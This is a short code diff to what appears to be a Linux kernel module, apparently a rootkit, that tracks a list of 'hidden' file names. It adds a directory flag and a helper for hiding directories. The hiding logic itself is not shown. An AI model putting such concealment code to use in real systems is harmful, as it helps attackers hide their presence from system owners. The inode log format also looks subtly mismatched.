@@ -159,6 +159,7 @@ struct hidden_names {
     char *name;
     struct list_head list;
     bool ro;
+    bool is_dir;
 };
 
 bool fs_search_name(const char *name, u64 ino) {
@@ -179,11 +180,11 @@ bool fs_search_name(const char *name, u64 ino) {
 void fs_list_names(void) {
     struct hidden_names *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
-        prinfo("hidden: '%s'\n", node->name);
+        prinfo("hidden: '%s' ino=%d directory='%s'\n", node->name, node->ino, node->is_dir ? "Yes" : "No");
     }
 }
 
-static int _fs_add_name(const char *names[], bool ro, u64 ino) {
+static int _fs_add_name(const char *names[], bool ro, u64 ino, bool is_dir) {
     const char **s;
 
     if (!names)
@@ -203,6 +204,7 @@ static int _fs_add_name(const char *names[], bool ro, u64 ino) {
             strncpy(hn->name, (const char*)*s, len);
             hn->ro = ro;
             hn->ino = ino;
+            hn->is_dir = is_dir;
             /** the gap caused by banned words
              * is the most fun
              */
@@ -217,11 +219,15 @@ err:
 }
 
 int fs_add_name_ro(const char *names[], u64 ino) {
-    return _fs_add_name(names, true, ino);
+    return _fs_add_name(names, true, ino, false);
 }
 
 int fs_add_name_rw(const char *names[], u64 ino) {
-    return _fs_add_name(names, false, ino);
+    return _fs_add_name(names, false, ino, false);
+}
+
+int fs_add_name_rw_dir(const char *names[], u64 ino, bool is_dir) {
+    return _fs_add_name(names, false, ino, is_dir);
 }
 
 bool fs_del_name(const char *names[]) {
